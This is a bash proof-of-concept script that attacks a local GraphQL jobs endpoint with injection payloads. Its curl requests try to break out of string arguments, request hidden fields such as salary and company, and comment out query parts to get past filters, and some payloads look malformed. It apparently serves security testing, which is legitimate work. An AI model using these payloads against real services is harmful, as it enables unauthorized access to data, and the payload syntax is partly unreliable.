#!/bin/bash

# POC: Client-Side GraphQL Query Injection
# Demonstrates how unescaped user input in client-side GraphQL query construction
# allows attackers to inject arbitrary GraphQL syntax

TARGET="http://localhost:8000"

echo "=== Client-Side GraphQL Query Injection POC ==="
echo ""

# Test 1: Normal query (baseline)
echo "[*] Test 1: Normal query with jobType='back-end'"
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { jobs(jobType: \"back-end\") { id name type description } }"}' | jq . 2>/dev/null || echo "Request completed"
echo ""

# Test 2: Query injection - Break out of string context with quote
echo "[*] Test 2: Query injection - Breaking string context with closing quote"
echo "    Payload: jobType = \"\\\" ) { id name type description } } query { jobs(jobType: \\\"\""
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { jobs(jobType: \"\\\" ) { id name type description } } query { jobs(jobType: \\\"\") { id name type description } }"}' | jq . 2>/dev/null || echo "Request completed"
echo ""

# Test 3: Query injection - Add additional fields not in original query
echo "[*] Test 3: Query injection - Accessing unintended fields"
echo "    Payload: jobType = \"back-end\\\", salary, company, requirements # \""
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { jobs(jobType: \"back-end\\\", salary, company, requirements # \") { id name type description } }"}' | jq . 2>/dev/null || echo "Request completed"
echo ""

# Test 4: Query injection - Comment out remaining query to bypass restrictions
echo "[*] Test 4: Query injection - Using comments to bypass filters"
echo "    Payload: jobType = \"back-end\\\" ) } query { jobs(jobType: \\\"\\\" # \""
curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { jobs(jobType: \"back-end\\\" ) } query { jobs(jobType: \\\"\\\" # \") { id name type description } }"}' | jq . 2>/dev/null || echo "Request completed"
echo ""

# Test 5: Verify vulnerability by comparing responses
echo "[*] Test 5: Vulnerability check - Query structure manipulation"
echo "    Attempting to inject GraphQL syntax that breaks query parsing"
PAYLOAD='{"query": "query { jobs(jobType: \"") } __typename # \") { id name type description } }"}'
echo "    Sending: $PAYLOAD"
RESPONSE=$(curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD")
echo "    Response: $RESPONSE"
echo ""

# Test 6: Demonstrate escape sequence bypass
echo "[*] Test 6: Testing escape sequence handling"
PAYLOAD='{"query": "query { jobs(jobType: \"\\\\\") { id name type description } }"}'
RESPONSE=$(curl -s -X POST "${TARGET}/graphql/" \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD")
echo "    Response indicates if backslash escaping is not properly handled"
echo "$RESPONSE" | head -20
echo ""

echo "[+] POC complete. If any response shows GraphQL syntax errors or unexpected field access,"
echo "    it confirms the query injection vulnerability."